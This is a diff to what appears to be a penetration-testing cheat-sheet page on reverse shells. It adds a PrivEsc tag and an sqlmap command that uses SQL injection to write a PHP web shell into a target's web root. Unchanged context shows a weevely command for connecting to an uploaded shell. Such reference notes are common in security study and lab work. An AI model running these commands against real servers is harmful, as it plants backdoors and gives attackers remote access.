@@ -1,7 +1,7 @@
 ---
 title: Reverse Shell
 desc: 
-tags: [Linux, Netcat, Privilege, Reverse, Shell, Windows]
+tags: [Linux, Netcat, PrivEsc, Privilege, Reverse, Shell, Windows]
 alts: [Linux-Privilege-Escalation, Windows-Privilege-Escalation]
 render_with_liquid: false
 ---
@@ -112,6 +112,13 @@ render_with_liquid: false
 
         Then upload the payload, or copy the content and paste to somewhere in the target website directly, and reload the page.
 
+    - **Upload the Payload using SQLi**
+
+        ```sh
+        # req.txt: The request settings file which is saved using Burp Suite
+        sqlmap -r req.txt --dbs --random-agent --batch --file-dest=/var/www/html/shell.php --file-write=./shell.php
+        ```
+
     - **Useful Tools**
 
         - **[Weevely3](https://github.com/epinna/weevely3){:target="_blank"}**
@@ -136,7 +143,6 @@ render_with_liquid: false
 
                 ```sh
                 weevely https://vulnerable.com/upload/shell.php <password>
-
                 ```
 
 4. **Upgrade to a Full Functional Shell**
